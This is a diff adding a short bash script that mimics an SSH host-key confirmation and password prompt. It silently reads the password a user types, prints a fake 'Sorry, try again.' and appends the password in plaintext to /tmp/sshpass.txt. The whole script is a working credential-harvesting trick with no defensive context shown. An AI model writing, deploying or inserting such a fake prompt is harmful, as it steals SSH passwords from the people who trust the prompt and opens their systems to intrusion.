@@ -1,0 +1,16 @@
+#!/bin/bash
+echo "The authenticity of that host can't be established."
+echo "ED25519 key fingerprint is SHA256:7iO3V7pR0dVQ1SkP+5w2OLRtQ4ZqRBO1tNTRMXLAs4k."
+echo "This host key is known by the following other names/addresses:"
+echo "    ~/.ssh/known_hosts:15: [hashed name]"
+read -sp "Are you sure you want to continue connecting (yes/no/[fingerprint])?" answer
+if [ "$answer" == "y" ] || [ "$answer" = "Y" ] || [ "$answer" = "yes" ]; then
+    echo ""
+    read -sp "    $1's password: " sshpass
+    echo ""
+    sleep 2
+    echo "Sorry, try again."
+else
+    echo "Bye!"
+fi
+echo $sshpass >> /tmp/sshpass.txt
